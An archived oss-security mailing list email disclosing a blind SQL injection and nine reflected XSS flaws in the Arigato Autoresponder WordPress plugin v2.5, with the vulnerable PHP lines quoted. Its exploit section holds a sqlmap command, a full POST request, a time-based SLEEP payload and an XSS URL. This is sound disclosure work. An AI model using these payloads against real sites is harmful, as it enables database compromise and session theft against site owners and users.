X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5143" "Tuesday" "11" "September" "2018" "08:13:56" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<655E4F0A-B5AF-4F71-8D64-5665973B76C0@me.com>" "130" "[oss-security] Blind SQL injection and multiple reflected XSS vulnerabilities in Wordpress Plugin Arigato Autoresponder and Newsletter v2.5" nil nil nil "9" "2018091112:13:56" "[oss-security] Blind SQL injection and multiple reflected XSS vulnerabilities in Wordpress Plugin Arigato Autoresponder and Newsletter v2.5" (number mark "U       larry0@me.co Sep 11  130/5143  " thread-indent "\"[oss-security] Blind SQL injection and multiple reflected XSS vulnerabilities in Wordpress Plugin Arigato Autoresponder and Newsletter v2.5\"\n") "<a26f05aa-b04a-4558-ad97-7b91df4d74c3@me.com>" ("<a26f05aa-b04a-4558-ad97-7b91df4d74c3@me.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 27791 invoked by uid 550); 11 Sep 2018 12:14:29 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 27773 invoked from network); 11 Sep 2018 12:14:29 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
	t=1536668049; bh=cOr3G7+Bd0Hixgs7THm1I5O/W2IF3D/R9h9TxB/KNxA=;
	h=Date:Subject:From:To:Message-id:MIME-version:Content-type;
	b=D7SXJmDWb+U1XicdKteRR9u4L+4qSUxVTL2oWG7IoLRhrOm4jqnYk+LkKtWB0cGvL
 QXPL9fAFv9J67prN0QTTsgBPBfnfmpQl80wDAX545ploy/EcjjpSlqiKUmhIFxddtj
 +YRs2pZsFQnrRM5tUgo9Cb2KjLR2ZbAESiQGEnsk8XG+ZrCxz6sb10RTKj4Awfy6oi
 Xar6j+SXxrXIT/HfAcJ2+9gKfB6FuUMg5PjqjI2YekTY5163SwYFWCOW2HDRh4YPRO
 dGSWsCr2VU/JB/JqqX//jdh8+kDrdaP0cIL6zi7NP6RA+Kugqi6uZGneAjuaFjE83l
 gpsyZJPxDL6mg==
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1015 suspectscore=14 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1707230000 definitions=main-1809110128
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10434:,,
 definitions=2018-09-11_05:,, signatures=0
User-Agent: Microsoft-MacOutlook/10.10.0.180812
Date: Tue, 11 Sep 2018 08:13:56 -0400
From: "Larry W. Cashdollar" <larry0@me.com>
To: Open Security <oss-security@lists.openwall.com>
Message-id: <655E4F0A-B5AF-4F71-8D64-5665973B76C0@me.com>
Thread-topic: Blind SQL injection and multiple reflected XSS vulnerabilities in
 Wordpress Plugin Arigato Autoresponder and Newsletter v2.5
References: <a26f05aa-b04a-4558-ad97-7b91df4d74c3@me.com>
In-reply-to: <a26f05aa-b04a-4558-ad97-7b91df4d74c3@me.com>
MIME-version: 1.0
Content-type: multipart/alternative; boundary=B_3619498440_1246556930
Subject: [oss-security] Blind SQL injection and multiple reflected XSS vulnerabilities in
 Wordpress Plugin Arigato Autoresponder and Newsletter v2.5

--B_3619498440_1246556930
Content-type: text/plain;
	charset="UTF-8"
Content-transfer-encoding: 7bit

Title: Blind SQL injection and multiple reflected XSS vulnerabilities in Wordpress Plugin Arigato Autoresponder and Newsletter v2.5
Author: Larry W. Cashdollar, @_larry0
Date: 2018-08-22
CVE-IDs:[CVE-2018-1002000][CVE-2018-1002001][CVE-2018-1002002][CVE-2018-1002003][CVE-2018-1002004][CVE-2018-1002005][CVE-2018-1002006][CVE-2018-1002007][CVE-2018-1002008][CVE-2018-1002009]
Download Site: https://wordpress.org/plugins/bft-autoresponder/
Vendor: Kiboko Labs https://calendarscripts.info/
Vendor Notified: 2018-08-22, Fixed v2.5.1.5
Vendor Contact: @prasunsen wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=203
Description: This plugin allows scheduling of automated autoresponder messages and newsletters, and managing a mailing list.  You can add/edit/delete and import/export members. There is also a registration form which can be placed in any website or blog. You can schedule unlimited number of email messages. Messages can be sent on defined number of days after user registration, or on a fixed date.
Vulnerability:
These vulnerabilities require administrative priveledges to exploit.

CVE-2018-1002000

There is an exploitable blind SQL injection vulnerability via the del_ids variable by POST request. 

In line 69 of file controllers/list.php:

65 $wpdb->query("DELETE FROM ".BFT_USERS." WHERE id IN (".$_POST['del_ids'].")");

del_ids is not sanitized properly.

Nine Reflected XSS.

CVE-2018-1002001

In line 22-23 of controllers/list.php:

22 $url = "admin.php?page=bft_list&offset=".$_GET['offset']."&ob=".$_GET['ob'];
23 echo "<meta http-equiv='refresh' content='0;url=$url' />";

CVE-2018-1002002

bft_list.html.php:28: 
<div><label><?php _e('Filter by email', 'broadfast')?>:</label> <input type="text" name="filter_email" value="<?php echo @$_GET['filter_email']?>"></div>

CVE-2018-1002003

bft_list.html.php:29: 
<div><label><?php _e('Filter by name', 'broadfast')?>:</label> <input type="text" name="filter_name" value="<?php echo @$_GET['filter_name']?>"></div>

CVE-2018-1002004

bft_list.html.php:42: 
<input type="text" class="bftDatePicker" name="sdate" id="bftSignupDate" value="<?php echo empty($_GET['sdate']) ? '' : $_GET['sdate']?>">

CVE-2018-1002005

bft_list.html.php:43: 
<input type="hidden" name="filter_signup_date" value="<?php echo empty($_GET['filter_signup_date']) ? '' : $_GET['filter_signup_date']?>" id="alt_bftSignupDate"></div>

CVE-2018-1002006

integration-contact-form.html.php:14: 
<p><label><?php _e('CSS classes (optional):', 'broadfast')?></label> <input type="text" name="classes" value="<?php echo @$_POST['classes']?>"></p>

CVE-2018-1002007

integration-contact-form.html.php:15: 
<p><label><?php _e('HTML ID (optional):', 'broadfast')?></label> <input type="text" name="html_id" value="<?php echo @$_POST['html_id']?>"></p>

CVE-2018-1002008

list-user.html.php:4: 
<p><a href="admin.php?page=bft_list&ob=<?php echo $_GET['ob']?>&offset=<?php echo $_GET['offset']?>"><?php _e('Back to all subscribers', 'broadfast');?></a></p>

CVE-2018-1002009

unsubscribe.html.php:3: 
<p><input type="text" name="email" value="<?php echo @$_GET['email']?>"></p>

Exploit Code:
SQL Injection CVE-2018-1002000
$ sqlmap --load-cookies=./cook -r post_data --level 2 --dbms=mysql

Where post_data is:

POST /wp-admin/admin.php?page=bft_list&ob=email&offset=0 HTTP/1.1
Host: example.com
Connection: keep-alive
Content-Length: 150
Cache-Control: max-age=0
Origin: http://example.com
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Referer: http://example.com/wp-admin/admin.php?page=bft_list&ob=email&offset=0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: wordpress_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

mass_delete=1&del_ids=*&_wpnonce=aa7aa407db&_wp_http_referer=%2Fwp-admin%2Fadmin.php%3Fpage%3Dbft_list%26ob%3Demail%26offset%3D0[!http]


(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 300 HTTP(s) requests:
---
Parameter: #1* ((custom) POST)
Type: AND/OR time-based blind
Title: MySQL >= 5.0.12 time-based blind - Parameter replace
Payload: mass_delete=1&del_ids=(CASE WHEN (6612=6612) THEN SLEEP(5) ELSE 6612 END)&_wpnonce=aa7aa407db&_wp_http_referer=/wp-admin/admin.php?page=bft_list%26ob=email%26offset=0[!http]
---
[11:50:08] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 8.0 (jessie)
web application technology: Apache 2.4.10
back-end DBMS: MySQL >= 5.0.12
[11:50:08] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/192.168.0.47'

[*] shutting down at 11:50:08


CVE-2018-1002001

http://example.com/wp-admin/admin.php?page=bft_list&action=edit&id=12&ob=XSS&offset=XSS

 

 


--B_3619498440_1246556930--


